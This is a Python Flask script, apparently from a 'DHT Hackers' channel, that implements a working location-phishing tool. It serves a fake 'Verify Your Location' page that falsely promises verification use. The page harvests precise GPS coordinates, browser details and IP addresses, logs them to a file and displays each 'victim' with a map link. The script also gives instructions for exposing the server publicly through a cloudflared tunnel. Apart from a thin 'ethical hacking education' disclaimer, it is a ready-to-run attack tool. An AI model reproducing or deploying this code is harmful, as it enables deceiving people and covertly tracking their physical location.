import os
import time
import json
import pyfiglet
from datetime import datetime
from flask import Flask, request, render_template_string
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich.align import Align

console = Console()
app = Flask(__name__)
capture_file = "captures.json"
captures = []

if os.path.exists(capture_file):
    with open(capture_file, "r", encoding="utf-8") as f:
        try:
            captures = json.load(f)
        except json.JSONDecodeError:
            captures = []

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner(text, style):
    banner = pyfiglet.figlet_format(text)
    console.print(Align.center(f"[{style}]{banner}[/{style}]"))

def dht_hackers_banner():
    clear()
    show_banner("DHT-HACKERS", "bold red")
    console.print(Panel.fit(
        "[green]This tool is for ethical hacking education only.\n"
        "[cyan]Watch full tutorial:[/cyan] [bold blue]https://youtube.com/@dht-hackers_10[/bold blue]",
        title="[bold yellow]DHT Hackers Tool[/bold yellow]",
        border_style="magenta",
        padding=(1, 2)
    ))
    time.sleep(2)
    if os.name == "posix":
        os.system("termux-open-url https://youtube.com/@dht-hackers_10")
    Prompt.ask("[yellow]Press Enter after subscribing to continue...[/yellow]")
    clear()

def phishing_tool_banner():
    show_banner("PHISHER", "bold blue")
    console.print(Panel.fit(
        "[cyan]Location phishing tool using Python, Flask & Rich\n"
        "[magenta]Made by:[/magenta] [bold green]DHT Hackers Team[/bold green]",
        title="[bold green]Welcome[/bold green]",
        border_style="cyan",
        padding=(1, 2)
    ))

PHISHING_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Location Verification</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #e3f2fd;
      display: flex;
      height: 100vh;
      justify-content: center;
      align-items: center;
      margin: 0;
    }
    .container {
      background: white;
      padding: 30px 40px;
      border-radius: 15px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
      max-width: 400px;
      text-align: center;
    }
    h2 {
      color: #0d47a1;
      margin-bottom: 10px;
    }
    p {
      font-size: 15px;
      color: #555;
      margin-bottom: 25px;
    }
    button {
      background-color: #1976d2;
      color: white;
      font-weight: 600;
      border: none;
      padding: 14px 28px;
      border-radius: 10px;
      cursor: pointer;
      font-size: 17px;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #115293;
    }
    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #999;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Verify Your Location</h2>
    <p>For security reasons, please allow access to your location.</p>
    <button onclick="requestLocation()">Allow Location Access</button>
    <div id="status" style="margin-top: 20px; color: green; font-weight: 600;"></div>
    <div class="footer">Your location will be used only for verification purposes.</div>
  </div>

<script>
function requestLocation() {
  if (!navigator.geolocation) {
    alert("Geolocation is not supported by your browser.");
    return;
  }

  navigator.geolocation.getCurrentPosition(success, error, {
    enableHighAccuracy: true, timeout: 15000, maximumAge: 0
  });
}

function success(position) {
  const data = {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy,
    altitude: position.coords.altitude,
    altitudeAccuracy: position.coords.altitudeAccuracy,
    heading: position.coords.heading,
    speed: position.coords.speed,
    timestamp: position.timestamp,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    cookieEnabled: navigator.cookieEnabled,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
  };

  fetch('/save-location', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  }).then(() => {
    document.getElementById('status').textContent = 'Location captured. Thank you!';
  }).catch(() => {
    document.getElementById('status').textContent = 'Failed to send location.';
  });
}

function error(err) {
  alert("Error getting location: " + err.message);
}
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(PHISHING_PAGE)

@app.route('/save-location', methods=['POST'])
def save_location():
    data = request.get_json()
    if not data:
        return "Invalid data", 400
    data['ip'] = request.remote_addr
    captures.append(data)
    save_to_file()
    print_capture(data)
    return "Location saved", 200


def save_to_file():
    try:
        with open(capture_file, "w", encoding="utf-8") as f:
            json.dump(captures, f, indent=4)
    except Exception as e:
        console.log(f"[red]Error saving to file:[/red] {e}")

def print_capture(c):
    from textwrap import wrap

    def wrap_value(text, lines=1, width=48):
        wrapped = wrap(str(text), width)
        while len(wrapped) < lines:
            wrapped.append("")  
        return "\n".join(wrapped[:lines])

    latitude = c.get("latitude", 0)
    longitude = c.get("longitude", 0)
    maps_url = f"https://www.google.com/maps?q={latitude},{longitude}"
    info_table = Table(title="New Capture", show_lines=True, border_style="green")
    info_table.add_column("Field", style="cyan", justify="right", width=14, no_wrap=True)
    info_table.add_column("Value", style="magenta")

    fields = [
        ("Time", datetime.fromtimestamp(c["timestamp"] / 1000).strftime("%Y-%m-%d %H:%M:%S")),
        ("Latitude", f"{latitude:.6f}"),
        ("Longitude", f"{longitude:.6f}"),
        ("Accuracy", str(c.get("accuracy", "N/A"))),
        ("Platform", c.get("platform", "N/A")),
        ("Language", c.get("language", "N/A")),
        ("IP", c.get("ip", "N/A")),
        ("User-Agent", wrap_value(c.get("userAgent", "N/A"), 5)),
    ]

    for key, val in fields:
        info_table.add_row(key, val)

    maps_table = Table(title="Google Maps Link", border_style="blue")
    maps_table.add_column("URL", style="bold green", overflow="fold")
    maps_table.add_row(maps_url)

    console.print(info_table)
    console.print(maps_table)
    console.print(Panel("[bold yellow]Waiting for next victim...[/bold yellow]", border_style="yellow"))

if __name__ == '__main__':
    dht_hackers_banner()
    phishing_tool_banner()
    console.print("[bold blue]Phishing server running at:[/bold blue] http://0.0.0.0:5000")
    console.print("[bold red]open new session by sliding from left and run")
    console.print("[bold yellow]cloudflared tunnel --url localhost:5000")
    app.run(host='0.0.0.0', port=5000)
    